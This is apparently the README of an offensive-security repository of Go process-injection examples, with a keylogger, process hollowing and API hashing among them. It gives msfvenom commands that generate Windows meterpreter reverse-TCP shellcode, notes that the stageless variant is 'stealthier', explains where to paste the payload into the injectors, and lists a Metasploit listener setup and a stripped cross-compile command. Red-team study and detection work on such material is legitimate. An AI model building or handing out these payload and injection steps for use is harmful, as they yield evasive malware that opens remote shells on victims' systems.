# go-inject

Process injection techniques written in Go. I've also expanded this repo to include some general offense techniques in Go.

## Examples

Process Injection

* [Classic virtual alloc](examples/x64/valloc/valloc.go)
* [Heap](examples/x64/heap/heap.go)
* [Remote Thread Injection](examples/x64/remote-thread/remote_thread.go)
* [APC Queue Code Injection](examples/x64/queue-user-apc/queue.go)
* [UUID Injection - Used by Lazarus 2021](examples/x64/uuid/uuid.go)

Other offensive techniques:

* [Hook detection](examples/x64/detect-hooks/detect-hooks.go)
* [Keylogger](examples/x64/keylog/keylog.go)
* [Hollow](examples/x64/hollow/hollow.go)
* [API Hashing](examples/x64/api_hash/api_hash.go)

## Usage

Use msfvenom to generate shellcode:
```bash
# Option 1: Testing with calculator.
msfvenom -p windows/x64/exec CMD=calc.exe -f hex

# Option 2: Reverse tcp stager.
msfvenom -p windows/x64/meterpreter/reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444

# Option 3: Stageless payload - stealthier.
msfvenom -p windows/x64/meterpreter_reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444
```

Place payload string from above command within one of the example .go files replacing the content of the `payload` variable. If using uuid example, use [shellcode-to-uuids](helpers/shellcode-to-uuids.go) to convert to payload.

Start listener:

```bash
use payload/windows/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
to_handler
```

## Build Examples

Linux:
```bash
env GOOS=windows go build -ldflags="-s -w" -trimpath examples/x64/uuid/uuid.go
```

## References

* https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/
* https://github.com/Adepts-Of-0xCC/VBA-macro-experiments/blob/main/EDRHookDetector.vba
* https://github.com/brimstone/go-shellcode
* https://github.com/sysdream/hershell
* https://github.com/yoda66/MalwareDevTalk
* https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/
* https://medium.com/@justen.walker/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724
* https://posts.specterops.io/adventures-in-dynamic-evasion-1fe0bac57aa
* https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
* https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection
* https://github.com/abdullah2993/go-runpe
